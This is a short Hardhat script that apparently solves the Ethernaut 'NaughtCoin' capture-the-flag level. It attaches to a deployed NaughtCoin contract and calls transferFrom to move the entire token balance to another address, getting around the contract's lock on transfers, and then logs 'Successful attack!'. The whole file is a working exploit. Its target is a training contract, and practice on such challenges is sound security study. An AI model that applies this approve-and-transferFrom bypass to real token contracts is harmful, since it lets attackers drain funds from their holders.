const hre = require("hardhat");

async function main() {

  const naughtCoinAddress = '0x308C37e288ed0452A089eB962d2551489549167F';
  const transferFromAddress = '0xF60Ba5a095EFAFA71c4c71e3E0C0c09Bcc76FEf4';
  const transferToAddress = '0xaE517b23F1c5C26940Aaf9Edfd8382E1eA92B119';

  const NaughtCoin = await ethers.getContractFactory('NaughtCoin');
  const naughtCoin = await NaughtCoin.attach(naughtCoinAddress);

  await naughtCoin.transferFrom(transferFromAddress, transferToAddress, '1000000000000000000000000');

  console.log("Successful attack!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
